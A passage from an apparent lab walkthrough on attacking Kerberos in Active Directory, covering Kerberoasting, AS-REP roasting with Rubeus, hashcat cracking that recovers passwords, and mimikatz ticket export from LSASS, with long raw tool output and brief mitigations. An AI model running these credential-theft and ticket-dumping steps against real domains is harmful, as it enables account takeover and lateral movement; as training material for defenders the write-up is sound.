e563e38ade046d75c3702bedfb964ef6c234639ef2893166c806de39fd7671f2eb8f7c65022ab69584957739c59a7e931098e54cfd3a8122d155e50711c3cec84866ea73b55f3c57d586f6b36cf45bbab116d85cd146394945c0b0fbbc27a79055b3f8144504d5a72da0e983ba8123de23c6b07aa75209d21bf635d6e9027937b2860286cebf9b99c55abfa571c04a9e600cf13695e42dfd16606af7ecff7116676834e270b6cfaf605d7171812896d819851ac3a4e63cc1f7ff470e5b880dee423f99194e8097fc41966b459f21b1a284c10e04af207fe7346099c4cdd6e8e6bc35cbcacb0eec640af0a52e3ada07ef568fc53531aeee42a58d12c9cfb960f66f44fdfa3ba23214934a3a15261d233c691fb0133d1f300ec687599b0f07a0d983faeacb1134e3182f2133bda84bb9c0f4c62ccee1e9d796a46a38f6a701998605ea21c25684db58a4213469fa4461c1cf009f99e7cebf813daccfbf6854353f06ce6f6789a36e5c789caf4dd303bb0d96fb2ad209bef06399d5c9349a72769c621cb4fb019c8fe3ccdec34cf20e8708775f1507f49d3b77ae977519ab3b1db48af9669492abd303793b09cf9532e529aaf7d33f389e2eb421c6f08da674fc7c071b745417c315c1b159847cd3953a6a177f95c155ef1cb2c1f0014533ae51197bbcb28edff29c32ae5339e24ac2fd4b715e722df225317f6330f4d053c16893fb78dfe356b35e947e574d53e9dfeafba132960e1c6c745b16c2e72087ca02ab7ff253d21da8adea1414f5fb14183597040a05895ae88
```

### Cracking hashes w/ `hashcat`

```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

> Once cracked, if the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the `NTDS.dit`. 

> If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users.

### Mitigation

- **Strong Service Passwords** - If the service account passwords are strong then kerberoasting will be ineffective
- **Don't Make Service Accounts Domain Admins** - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.

![](img/kerberoasting.png)

___

## AS-REP Roasting w/ `Rubeus`

**AS-REP Roasting** dumps the `krbasrep5` hashes of user accounts that have Kerberos pre-authentication disabled.

> Unlike Kerberoasting these users do not have to be service accounts the only requirement to be AS-REP roastable is to have the privilege _"Does not require Pre-Authentication"_ set.

When pre-authentication is disabled, an attacker can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they pretend to be.

> Other tools such as **Impacket**'s `GetNPUsers.py` can be used for AS-REP Roasting. However, using `Rubeus` seems to be easier because it automatically finds AS-REP Roastable users whereas with `GetNPUsers.py` you have to enumerate the users beforehand and know which users may be AS-REP Roastable. Nevertheless, `GetNPUsers.py` can be executed remotely.

```cmd
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe asreproast

   ______        _                       
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::d446:40d2:5146:4c63%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:AF525F76A5539927634AF3C9FF498C3B$1052948C7ED2
      ED42FD08A3134A49764F544D0AEB7E29238F3C2BD9FBF6EBDDB76F0EBEF62A50A35CD1C37B1AE4DA
      4579344FB818AA2ACB7E19E634A6D77AACD6FFD58BAC470579E3B6EDDE6FD4A3A5E956000A1241D0
      2C03B0397775EB788E4B86B1C42AC4FBC91A27A1CBEAAE9B11BAEDEE2718B3C0B346405AE5B033CA
      E69A853F9AD5BF7FE5A4B7099AA3E5D65D1E555DA846C4484DC07FD45B64B371A2D550A7FD821CFC
      0E8D1B2A4675FA47950779707B08782AD2E30F532CC444613CC0F92F1E920B0E650485C5A635F660
      15BE94E2B17A18D6E5DE21820EFE9FB0F7365E83FA7BFA90DE46B4D204C24045A3E2C4D2CF2D

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::d446:40d2:5146:4c63%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:DCD41B4073F3EC71C7B3E40EAC812E4D$A782DCC43409B
      182863770DC7CD5F51F8C024BB6E76E4572E5588CB5357CE93D5900CD266C58A934763A2CCBE45F5
      CCB01FDEB3794948C3F28E196957A4B451F0332691D55A5CCC591DBFD69C7DBA8082D0D9706ED7B9
      9BAB24DB7EC5881F45B258E5C221429E9C8B776B19C75C86A221A393A77EE60CBE0F4BE5A8D239CB
      81BCA53432409572F9B18280FA43626F4209BDA4E814CA67762FDDD24FD754FD69DEFE19B11932CE
      F952C3B5403E5734C45DD81B075F346543D538A92F0C88DD6D3D810633E38DF0B4F75DC0CAAE4E92
      96C026D3FB46968DE35AF5DB76841E192113554EF1373B3C6506B3B8BBA5C78D0F3585E3A3B
```

### Cracking hashes with `hashcat`

```console
root@kali:~/thm/attacking-kerberos# hashcat -m 18200 hashes2.txt Pass.txt --show
$krb5asrep$23$Admin2@CONTROLLER.local:af525f76a5539927634af3c9ff498c3b$1052948c7ed2ed42fd08a3134a49764f544d0aeb7e29238f3c2bd9fbf6ebddb76f0ebef62a50a35cd1c37b1ae4da4579344fb818aa2acb7e19e634a6d77aacd6ffd58bac470579e3b6edde6fd4a3a5e956000a1241d02c03b0397775eb788e4b86b1c42ac4fbc91a27a1cbeaae9b11baedee2718b3c0b346405ae5b033cae69a853f9ad5bf7fe5a4b7099aa3e5d65d1e555da846c4484dc07fd45b64b371a2d550a7fd821cfc0e8d1b2a4675fa47950779707b08782ad2e30f532cc444613cc0f92f1e920b0e650485c5a635f66015be94e2b17a18d6e5de21820efe9fb0f7365e83fa7bfa90de46b4d204c24045a3e2c4d2cf2d:P@$$W0rd2
$krb5asrep$23$User3@CONTROLLER.local:dcd41b4073f3ec71c7b3e40eac812e4d$a782dcc43409b182863770dc7cd5f51f8c024bb6e76e4572e5588cb5357ce93d5900cd266c58a934763a2ccbe45f5ccb01fdeb3794948c3f28e196957a4b451f0332691d55a5ccc591dbfd69c7dba8082d0d9706ed7b99bab24db7ec5881f45b258e5c221429e9c8b776b19c75c86a221a393a77ee60cbe0f4be5a8d239cb81bca53432409572f9b18280fa43626f4209bda4e814ca67762fddd24fd754fd69defe19b11932cef952c3b5403e5734c45dd81b075f346543d538a92f0c88dd6d3d810633e38df0b4f75dc0caae4e9296c026d3fb46968de35af5db76841e192113554ef1373b3c6506b3b8bba5c78d0f3585e3a3b:Password3
```

### Mitigations

- **Strong password policy**. With a strong password, the hashes will take longer to crack making this attack less effective

- **Don't turn off Kerberos Pre-Authentication** unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.

![](img/as-rep-roasting.png)

___

## Pass the Ticket w/ `mimikatz`

`Mimikatz` is very popular for dumping user credentials inside an active directory environment, however it can also be used to dump a TGT from LSASS memory.


- Export all the tickets into **.kirbi** files in the current directory:

```cmd
mimikatz # sekurlsa::tickets /export 

Authentication Id : 0 ; 254355 (00000000:0003e193)                            
Session           : Network from 0                                            
User Name         : CONTROLLER-1$                                             
Domain            : CONTROLLER                                                
Logon Server      : (null)                                                    
Logon Time        : 6/30/2021 7:38:47 AM                                      
SID               : S-1-5-18                                                  
                                                                              
         * Username : CONTROLLER-1$                                           
         * Domain   : CONTROLLER.LOCAL                                        
         * Password : (null)                                                  
                                                                              
        Group 0 - Ticket Granting Service                                     
                                                                              
        Group 1 - Client Ticket ?                                             
         [00000000]                                                           
           Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ;  
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL 
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             3633ce9240778c13c1d08aa6d1c26f2451b60b57544942a2cfd259b53d123aa7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e193]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket 

Authentication Id : 0 ; 254156 (00000000:0003e0cc)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/30/2021 7:38:47 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL 
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             3633ce9240778c13c1d08aa6d1c26f2451b60b57544942a2cfd259b53d123aa7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e0cc]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi ! 

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 216885 (00000000:00034f35)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:54 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ;
           Service Name (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             1f81eba6a7560d67ba65fc02acf036f0c40b88b6d1109b3e588d0062fc717a39
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;34f35]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 60274 (00000000:0000eb72)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:17 AM
SID               : S-1-5-90-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 7f 42 6c fd c4 76 f2 50 b2 3b 9f ae d0 73 b9 24 b1 6f 54 11 84 6c 08 b3 0e ba 5b 26 21 14 86 3d 7d 0b d7 83 ff e4 88 92 bd ed 77 03 4c 
b5 35 74 47 39 41 ea ea 99 bd f0 51 1a 05 87 37 76 28 a2 fb 61 20 3c 35 89 d4 5c e7 cd 18 fd b8 7b b3 6c 56 90 93 ac ef ad 09 16 92 c9 97 48 d2 97 6e 9d 2e 9
5 7d 33 df cd 82 e1 e9 8d 91 c6 62 e3 73 89 50 88 1d 15 45 a1 47 71 46 a0 bc ba a2 63 53 a0 62 3e a2 e9 d8 68 0c 29 2c b5 29 2a 78 ce 47 ed a5 3f da 72 57 b9
 a2 62 8b df fb 24 d4 95 ad 8d f1 a2 03 cd 14 93 5d 75 ac e7 78 56 17 aa 3a d2 a0 4b 78 8f 72 2d 7a f3 e5 29 cc 37 c9 e9 68 fd d7 50 7f a0 f9 05 f3 1a eb 4e 
d5 17 12 cb 9f 28 69 db a0 a4 a0 0a 73 c4 29 e2 74 d6 4e f1 bd ac 69 39 c2 b5 3a b6 0c aa 63 35 6c 3e 3b 9f bf 18

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:15 AM
SID               : S-1-5-20

         * Username : controller-1$
         * Domain   : CONTROLLER.local
         * Password : 7f 42 6c fd c4 76 f2 50 b2 3b 9f ae d0 73 b9 24 b1 6f 54 11 84 6c 08 b3 0e ba 5b 26 21 14 86 3d 7d 0b d7 83 ff e4 88 92 bd ed 77 03 4c 
b5 35 74 47 39 41 ea ea 99 bd f0 51 1a 05 87 37 76 28 a2 fb 61 20 3c 35 89 d4 5c e7 cd 18 fd b8 7b b3 6c 56 90 93 ac ef ad 09 16 92 c9 97 48 d2 97 6e 9d 2e 9
5 7d 33 df cd 82 e1 e9 8d 91 c6 62 e3 73 89 50 88 1d 15 45 a1 47 71 46 a0 bc ba a2 63 53 a0 62 3e a2 e9 d8 68 0c 29 2c b5 29 2a 78 ce 47 ed a5 3f da 72 57 b9
 a2 62 8b df fb 24 d4 95 ad 8d f1 a2 03 cd 14 93 5d 75 ac e7 78 56 17 aa 3a d2 a0 4b 78 8f 72 2d 7a f3 e5 29 cc 37 c9 e9 68 fd d7 50 7f a0 f9 05 f3 1a eb 4e 
d5 17 12 cb 9f 28 69 db a0 a4 a0 0a 73 c4 29 e2 74 d6 4e f1 bd ac 69 39 c2 b5 3a b6 0c aa 63 35 6c 3e 3b 9f bf 18

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32648 (00000000:00007f88)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:14 AM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 7f 42 6c fd c4 76 f2 50 b2 3b 9f ae d0 73 b9 24 b1 6f 54 11 84 6c 08 b3 0e ba 5b 26 21 14 86 3d 7d 0b d7 83 ff e4 88 92 bd ed 77 03 4c 
b5 35 74 47 39 41 ea ea 99 bd f0 51 1a 05 87 37 76 28 a2 fb 61 20 3c 35 89 d4 5c e7 cd 18 fd b8 7b b3 6c 56 90 93 ac ef ad 09 16 92 c9 97 48 d2 97 6e 9d 2e 9
5 7d 33 df cd 82 e1 e9 8d 91 c6 62 e3 73 89 50 88 1d 15 45 a1 47 71 46 a0 bc ba a2 63 53 a0 62 3e a2 e9 d8 68 0c 29 2c b5 29 2a 78 ce 47 ed a5 3f da 72 57 b9
 a2 62 8b df fb 24 d4 95 ad 8d f1 a2 03 cd 14 93 5d 75 ac e7 78 56 17 aa 3a d2 a0 4b 78 8f 72 2d 7a f3 e5 29 cc 37 c9 e9 68 fd d7 50 7f a0 f9 05 f3 1a eb 4e 
d5 17 12 cb 9f 28 69 db a0 a4 a0 0a 73 c4 29 e2 74 d6 4e f1 bd ac 69 39 c2 b5 3a b6 0c aa 63 35 6c 3e 3b 9f bf 18

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32706 (00000000:00007fc2)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:14 AM
SID               : S-1-5-96-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 7f 42 6c fd c4 76 f2 50 b2 3b 9f ae d0 73 b9 24 b1 6f 54 11 84 6c 08 b3 0e ba 5b 26 21 14 86 3d 7d 0b d7 83 ff e4 88 92 bd ed 77 03 4c 
b5 35 74 47 39 41 ea ea 99 bd f0 51 1a 05 87 37 76 28 a2 fb 61 20 3c 35 89 d4 5c e7 cd 18 fd b8 7b b3 6c 56 90 93 ac ef ad 09 16 92 c9 97 48 d2 97 6e 9d 2e 9
5 7d 33 df cd 82 e1 e9 8d 91 c6 62 e3 73 89 50 88 1d 15 45 a1 47 71 46 a0 bc ba a2 63 53 a0 62 3e a2 e9 d8 68 0c 29 2c b5 29 2a 78 ce 47 ed a5 3f da 72 57 b9
 a2 62 8b df fb 24 d4 95 ad 8d f1 a2 03 cd 14 93 5d 75 ac e7 78 56 17 aa 3a d2 a0 4b 78 8f 72 2d 7a f3 e5 29 cc 37 c9 e9 68 fd d7 50 7f a0 f9 05 f3 1a eb 4e 
d5 17 12 cb 9f 28 69 db a0 a4 a0 0a 73 c4 29 e2 74 d6 4e f1 bd ac 69 39 c2 b5 3a b6 0c aa 63 35 6c 3e 3b 9f bf 18

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 251459 (00000000:0003d643)
Session           : NetworkCleartext from 0
User Name         : Administrator
Domain            : CONTROLLER
Logon Server      : CONTROLLER-1
Logon Time        : 6/30/2021 7:38:38 AM
SID               : S-1-5-21-432953485-3795405108-1502158860-500

         * Username : Administrator
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/30/2021 7:38:38 AM ; 6/30/2021 5:38:38 PM ; 7/7/2021 7:38:38 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : Administrator ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             929d937b37ddd5617754e619372f33990465dbf31f434b737032a09ed0aa0501
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3d643]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi ! 

Authentication Id : 0 ; 251254 (00000000:0003d576)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/30/2021 7:38:37 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/30/2021 7:38:01 AM ; 6/30/2021 5:37:54 PM ;
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             28ca5925e323f8a7ae22e9d5e2ddd35d98d7cd2ebe375eb7ae57ab600a04af4e
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3d576]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 250419 (00000000:0003d233)
Session           : Service from 0
User Name         : sshd_3812
Domain            : VIRTUAL USERS
Logon Server      : (null)
Logon Time        : 6/30/2021 7:38:36 AM
SID               : S-1-5-111-3847866527-469524349-687026318-516638107-1125189541-3812

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : 7f 42 6c fd c4 76 f2 50 b2 3b 9f ae d0 73 b9 24 b1 6f 54 11 84 6c 08 b3 0e ba 5b 26 21 14 86 3d 7d 0b d7 83 ff e4 88 92 bd ed 77 03 4c 
b5 35 74 47 39 41 ea ea 99 bd f0 51 1a 05 87 37 76 28 a2 fb 61 20 3c 35 89 d4 5c e7 cd 18 fd b8 7b b3 6c 56 90 93 ac ef ad 09 16 92 c9 97 48 d2 97 6e 9d 2e 9
5 7d 33 df cd 82 e1 e9 8d 91 c6 62 e3 73 89 50 88 1d 15 45 a1 47 71 46 a0 bc ba a2 63 53 a0 62 3e a2 e9 d8 68 0c 29 2c b5 29 2a 78 ce 47 ed a5 3f da 72 57 b9
 a2 62 8b df fb 24 d4 95 ad 8d f1 a2 03 cd 14 93 5d 75 ac e7 78 56 17 aa 3a d2 a0 4b 78 8f 72 2d 7a f3 e5 29 cc 37 c9 e9 68 fd d7 50 7f a0 f9 05 f3 1a eb 4e 
d5 17 12 cb 9f 28 69 db a0 a4 a0 0a 73 c4 29 e2 74 d6 4e f1 bd ac 69 39 c2 b5 3a b6 0c aa 63 35 6c 3e 3b 9f bf 18

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 228429 (00000000:00037c4d)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/30/2021 7:38:01 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             3633ce9240778c13c1d08aa6d1c26f2451b60b57544942a2cfd259b53d123aa7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;37c4d]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 228350 (00000000:00037bfe)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/30/2021 7:38:01 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/30/2021 7:38:01 AM ; 6/30/2021 5:37:54 PM ;
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             28ca5925e323f8a7ae22e9d5e2ddd35d98d7cd2ebe375eb7ae57ab600a04af4e
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;37bfe]-1-0-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 218606 (00000000:000355ee)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:54 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ; 7/7/2021 7:37:54 AM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             d6e53445cc44228522982ea8518e399d9cff107beae6615c2a796738f47914e0
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;355ee]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !

Authentication Id : 0 ; 217518 (00000000:000351ae)
Session           : Network from 0
User Name         : CONTROLLER-1$
Domain            : CONTROLLER
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:54 AM
SID               : S-1-5-18

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 6/30/2021 7:37:54 AM ; 6/30/2021 5:37:54 PM ;
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             3633ce9240778c13c1d08aa6d1c26f2451b60b57544942a2cfd259b53d123aa7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;351ae]-1-0-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:17 AM
SID               : S-1-5-19

         * Username : (null)
         * Domain   : (null)
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 60293 (00000000:0000eb85)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:17 AM
SID               : S-1-5-90-0-1

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 
14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 0
7 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d
 27 77 7a b0 b2 22 c8 de 48 64 fd 21 2e da df 68 cc e0 3a 04 67 8a 11 a2 f8 f4 b0 b0 d1 e3 51 04 f1 fe da c9 f6 85 eb f4 25 a3 52 2a 00 e8 25 d3 9a 08 31 27 
86 cd b3 fe 6e 40 f6 ed 59 03 fe b1 3a 98 bf f7 d5 6c 74 3e de 5d fb 15 f4 08 c9 2b fd 0f c7 e7 6a 79 38 2c 93 4b

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 32866 (00000000:00008062)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/30/2021 7:37:14 AM
SID               : S-1-5-96-0-0

         * Username : CONTROLLER-1$
         * Domain   : CONTROLLER.local
         * Password : fe 09 4c 08 0b cb e9 93 22 f0 ac d0 03 6d 7a be dd 10 c4 32 a0 f9 14 72 e7 25 44 a7 23 39 a4 68 3b 82 9e 60 ef d4 d3 5a 8a 21 90 fe 71 
14 bb 16 cf 47 f1 d7 9b 3d e5 e3 da cf 67 7e 9b 36 32 75 87 57 1b fc 8e e9 4e f6 30 3d 88 24 6e 4f 15 b9 f8 26 d3 d0 83 c0 67 1c b4 59 2e d6 bd 13 07 60 5e 0
7 e7 ea 6e cd 77 da 97 f6 69 ea 4c 6e 75 e7 25 04 a5 d2 1d 6e 8b d2 90 4e a1 1d 63 1d 02 22 42 a9 07 0b 1b bb f1 dc 6e 14 ed ab fa e4 3b 90 41 0b 87 bb a2 4d
